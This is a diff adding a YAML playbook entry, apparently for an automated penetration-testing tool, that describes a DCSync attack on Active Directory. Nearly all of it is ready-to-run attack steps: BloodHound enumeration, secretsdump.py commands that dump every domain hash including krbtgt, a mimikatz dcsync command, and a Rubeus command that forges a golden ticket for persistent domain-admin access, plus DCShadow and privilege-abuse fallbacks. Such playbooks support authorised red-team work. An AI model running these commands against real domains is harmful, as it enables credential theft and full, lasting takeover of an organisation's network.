@@ -1,0 +1,40 @@
+id: ad_dcsync
+title: "AD — DCSync (replicate domain → krbtgt + every hash)"
+phase: lateral
+mitre: ["T1003.006", "T1558.001"]
+trigger:
+  services: ["kerberos", "ldap", "smb", "msrpc"]
+  ports:    [88, 389, 445, 135]
+  os_any:   ["windows server"]
+  technologies: ["active directory", "domain controller"]
+keywords: ["dcsync", "replicating directory changes", "drsuapi", "krbtgt hash", "ntds.dit"]
+preconditions:
+  - "Account with DS-Replication-Get-Changes + DS-Replication-Get-Changes-All (or Domain Admin)"
+  - "Reachability to a DC on TCP/445 + 135"
+steps:
+  - tool: bloodhound
+    cmd:  "bloodhound-python -d {domain} -u {user} -p {password} -ns {dc_ip} -c All --zip"
+    why:  "Find which accounts already have replication rights (Cypher: shortest path from cracked → DCSync-capable)"
+  - tool: secretsdump
+    cmd:  "secretsdump.py {domain}/{user}:{password}@{dc_ip} -just-dc"
+    why:  "Pull every domain hash (NTLM + Kerberos keys) — including krbtgt"
+  - tool: secretsdump
+    cmd:  "secretsdump.py {domain}/{user}:{password}@{dc_ip} -just-dc-user krbtgt"
+    why:  "Surgical — only krbtgt hash for golden ticket forging"
+  - tool: secretsdump
+    cmd:  "secretsdump.py {domain}/{user}:{password}@{dc_ip} -just-dc-ntlm"
+    why:  "NTLM hashes only (faster, smaller output for pass-the-hash spray)"
+  - tool: mimikatz
+    cmd:  "mimikatz.exe \"lsadump::dcsync /domain:{domain} /user:krbtgt\" exit"
+    why:  "From a Windows host with domain creds — same primitive, different tool"
+  - tool: rubeus
+    cmd:  "Rubeus.exe golden /user:Administrator /id:500 /domain:{domain} /sid:{domain_sid} /krbtgt:{krbtgt_ntlm_hash} /ptt"
+    why:  "Forge golden ticket with stolen krbtgt hash → impersonate any user, persistent until krbtgt rotated TWICE"
+expected_outcome: "Every domain hash including krbtgt → forge golden ticket → permanent DA"
+fallbacks:
+  - "If account lacks replication rights → look for accounts in 'Account Operators', 'Server Operators', or with GenericAll on Domain object"
+  - "DCShadow (T1207) — register fake DC, push arbitrary changes; needs SE_DEBUG"
+  - "After dumping: rotate krbtgt twice in real engagements as cleanup recommendation"
+references:
+  - "https://attack.mitre.org/techniques/T1003/006/"
+  - "https://www.thehacker.recipes/ad/movement/credentials/dumping/dcsync"
